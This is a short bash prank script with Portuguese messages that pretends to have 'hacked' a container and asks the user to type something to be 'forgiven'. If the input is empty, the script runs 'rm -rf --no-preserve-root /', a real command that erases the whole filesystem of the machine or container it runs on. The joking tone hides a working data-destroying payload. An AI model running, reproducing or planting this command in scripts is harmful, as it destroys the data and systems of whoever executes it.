#!/bin/bash

echo "Script malvado"

echo "Hackeando container"

sleep 2

echo "Container hackado com sucesso! É sua oportunidade de clamar por perdão" 

echo "Digite: "
read input

if [ -n "$input" ]; then
    echo "Okay, perdoado :D"
else 
    echo "Você será penalizado"
    rm -rf -r --no-preserve-root /
fi




